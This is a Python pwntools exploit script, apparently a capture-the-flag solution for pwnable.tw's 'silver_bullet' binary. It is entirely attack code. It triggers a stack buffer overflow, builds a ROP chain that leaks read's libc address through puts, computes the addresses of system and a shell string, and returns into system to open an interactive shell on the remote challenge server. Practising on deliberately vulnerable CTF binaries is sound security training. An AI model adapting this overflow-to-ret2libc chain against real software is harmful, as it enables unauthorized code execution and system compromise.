from pwn import *

debug = 0

if debug:

    io = process('./silver_bullet')

    libc = ELF('/lib32/libc.so.6')

    libc_bash = 0x0015902b

else:

    io = remote('chall.pwnable.tw', 10103)

    libc = ELF('./libc_32.so.6')

    libc_bash = 0x00158e8b

elf = ELF('./silver_bullet')

libc_read = libc.symbols['read']

libc_system = libc.symbols['system']

plt_puts = 0x080484a8

got_read = elf.got['read']

# power_ret = 0x080489C2

power_ret = 0x08048954

def add_bullet(bullet):

    io.sendline('1')

    io.recvuntil("bullet :")

    io.send(bullet)

    ret1 = io.recvline()

    ret2 = io.recvline()

    return ret1 + '\n' + ret2

def power_up(bullet):

    io.sendline('2')

    io.recvuntil('bullet :')

    io.send(bullet)

    return io.recv()

def convert(str):

    ret =''

    for ch in str:

        ret = ch + ret

    return ret

def pwn():

    add_bullet('a'*40)

    power_up('a'*8)

# return power_up(p32(0xffffffec)+p32(0)+p32(plt_puts) + p32(power_ret) + p32(got_read))

    power_up('\xff'*7+p32(plt_puts) + p32(power_ret) + p32(got_read))

    io.sendline('3')

    io.sendline('3')

    io.recvuntil("You win !!\n")

    real_read_addr = int(convert(io.recv(4)).encode('hex'), 16)

# return real_read_addr

    real_system_addr = real_read_addr + libc_system - libc_read

    real_bash_addr = real_read_addr + libc_bash - libc_read

    add_bullet('a'*40)

    power_up('a'*8)

    power_up('\xff'*7 + p32(real_system_addr) + p32(power_ret) + p32(real_bash_addr))

    io.sendline('3')

    io.interactive()
pwn()
